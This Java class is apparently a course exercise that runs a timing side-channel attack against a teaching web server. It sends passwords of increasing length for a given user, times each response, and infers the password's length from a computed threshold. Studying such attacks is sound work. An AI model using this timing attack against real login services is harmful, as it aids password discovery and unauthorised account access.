import java.util.ArrayList;
import java.util.Arrays;
import java.util.Collections;

public class CheckPasswordLength {

    private String baseUrl;
    private String username;
    private ArrayList<Double> timeMeasurements;
    private final int maxLength = 32;
    int difficulty;

    public CheckPasswordLength(String baseUrl, String username, int difficulty) {
        this.baseUrl = baseUrl;
        this.username = username;
        this.difficulty = difficulty;

    }

    private String createUrl(String baseUrl, String username, String password){
        String url_format = baseUrl + "?user=%s&password=%s&difficulty=%d";
        //String url1 = "http://aoi.ise.bgu.ac.il/\\?user=123\\&password=NaNaKaNaNa\\&difficulty=1";
        //String url2 = "http://aoi.ise.bgu.ac.il/?user=123&password=NaNaKaNaNa&difficulty=1";



        String url = String.format(url_format,username, password, difficulty);
        return url;
    }

    /**
     * this function try different lengths and measure their connections to the site
     * fill the ArrayList with sum of times off all length
     */
    public int measureConnectionWithDifferentLength(){
        timeMeasurements = new ArrayList<>();
        timeMeasurements.add(0.0);
        double bestMeasure;
        double lengthForBestMeasure;
        double diff = 1;
        String password = "a";
        double threshold=0;
        for (int i=1; i<=maxLength; i++){
            if(i == 6){
                threshold = getThreshold(timeMeasurements);
                for(int j=1; j< 6; j++){
                    if(timeMeasurements.get(j) > threshold){
                        return j;
                    }
                }
            }
            System.out.println("Time for length "+ i);
            String url = createUrl(this.baseUrl, this.username, password);
            URLRequest urlRequest = new URLRequest(url);
            double time = urlRequest.measureConnectionToGivenURLMinimum();
            if (i > 6 && time > threshold){
                System.out.println("the length is "+ i + " and time is "+ time);
                return i;
            }
            System.out.println("total time for length " +i+ " is " + time);
            timeMeasurements.add(time);
            password+="a";
        }
        double maxValue=  Collections.max(timeMeasurements);
        return timeMeasurements.indexOf(maxValue);
    }

    public double getThreshold(ArrayList<Double> timeList){
        ArrayList<Double> timeListCopy = new ArrayList<>(timeList);
        Collections.sort(timeListCopy);
        //assumming 0 is the max time, 4 is min time
        double SecondMaxTime = timeListCopy.get(4);
        double threshold = SecondMaxTime + (SecondMaxTime - timeListCopy.get(1)+ 1) * 5;
        return threshold;
    }



    /**
     * method to get the length of the password.
     * @return the index of max value in timeMeasurements array ==> the length of the password.
     */
    public int getLength(){
        System.out.println("--------all measurements of password length: -----------------");
        for (double d: timeMeasurements){
            System.out.println(d);
        }
        double maxValue=  Collections.max(timeMeasurements);
        System.out.println("The max time of measurement is "+maxValue );
        return timeMeasurements.indexOf(maxValue);
    }


}
